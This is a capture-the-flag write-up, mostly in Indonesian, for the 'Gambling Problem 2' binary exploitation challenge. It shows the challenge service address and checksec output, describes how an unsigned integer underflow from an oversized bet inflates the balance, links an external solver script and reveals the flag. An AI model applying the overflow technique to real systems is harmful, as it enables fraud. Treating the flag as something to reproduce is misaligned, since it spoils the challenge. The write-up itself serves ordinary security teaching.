# Binary Exploitation

| Forensik  |
| ------------- |
| [Gambling Problem 2](#1-gambling-problem-2-896-pts)|

## 1. Gambling Problem 2 (896 pts)

### Soal: 
Dek Depe found an online gambling service from * redacted * forum. Since this online gambling service has just opened, users are given money to start a gambling career. After being given the bin file through some insiders, Dek Depe realized that there was a deadly bug in the program. Help Dek Depe take advantage of the exploit!

nc 128.199.157.172 25880

Alternate download link:
https://drive.google.com/file/d/1CPDTTMre_LDErUC7aIOna_3AXn2EsG0F/view?usp=sharing

### Pembahasan: 
Kita cek dahulu filenya, didapatkan
File ELF 64-bit, not stripped
lebih lanjut:
```
gamblingProblem: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=3ca1d6aec4f6127e2167ff2750889ef12a4d7a84, for GNU/Linux 3.2.0, not stripped
```
lihat dengan checksec
```
	Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled

```
setelah dekompilasi program pada fungsi <code>shopTime</code>, kami menganalisa bahwa, flag akan diberikan jika uang lebih besar dari 0xdeadbeef dalam desimal 3735928559. hmmm apa bisa ya gambling dapat segitu? :( setelah itu ada barisan kode yang mencurigakan 
```
    if ( (unsigned int)money >= 0xDEADBEEF )
    {
      v1 = "idk what is this but here you go : ";
      sub_11B0("%s\n%s\n");
    }
```
kami berasumsi bahwa itu adalah integer oveflow, ya apa salahnya kita coba-coba wkwk. 
```
We're kind, so here's your starting money, it's on the house :)
Money : 24741

Continue playing (1 = yes/0 = no): 1
Place your bet : 90000
90000

Guess (Number 1-100): 1

```
dan setelah kami input uang menjadi jutaan.
```
Money : 4294542037

Continue playing (1 = yes/0 = no): 

```
setelah itu kita tukarkan uang untuk mendapatkan flag
berikut script yang kami buat [klik disini](https://github.com/ahm4ddm/Arsip-WU/blob/binary/Compfest%202020/Binary%20Exploitation/gambling-problem-2/solver.py)

<details>
<summary>Flagnya</summary>
COMPFEST12{laptop_pembuat_soalnya_BSOD_so_this_is_Zafirr_again_lol_39cbc5}
</details>

